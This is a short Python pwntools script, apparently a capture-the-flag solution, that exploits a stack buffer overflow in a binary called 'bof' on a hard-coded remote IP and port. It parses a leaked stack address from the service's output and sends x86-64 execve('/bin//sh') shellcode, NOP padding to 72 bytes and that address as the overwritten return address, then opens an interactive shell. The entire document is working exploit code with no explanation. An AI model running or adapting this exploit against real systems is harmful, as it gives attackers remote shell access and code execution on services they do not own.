from pwn import *
p = remote("139.59.30.165",8900)
#p = process('./bof')
#e = ELF('./bof')


shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
d = p.recv(1024)
leak = int(d.split('\n')[2].split(' ')[-1], 0)

p.sendline(shellcode + "\x90"*(72-len(shellcode)) + p64(leak))
p.interactive()

